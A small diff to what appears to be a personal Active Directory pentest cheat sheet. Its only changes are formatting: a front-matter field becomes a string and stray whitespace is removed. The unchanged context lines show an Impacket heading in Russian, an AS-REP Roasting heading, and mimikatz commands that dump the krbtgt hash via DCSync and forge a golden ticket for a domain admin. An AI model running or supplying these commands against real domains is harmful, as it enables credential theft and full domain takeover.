@@ -3,11 +3,11 @@ id: "vui5r0ay7mmesj1aq"
 title: "AD"
 tags: []
 isFavorite: false
-order: 3
+order: "3"
 createdAt: "2026-03-06T11:07:45.362Z"
 updatedAt: "2026-03-06T11:45:02.269Z"
 ---
- Impacket (Linux) — нужны имена пользователей
+Impacket (Linux) — нужны имена пользователей
 
 AS-REP Roasting
 
@@ -121,7 +121,3 @@ mimikatz # lsadump::dcsync /user:krbtgt
 mimikatz # kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx
 /krbtgt:hash /ptt
 ```
-
-
-
-                                      
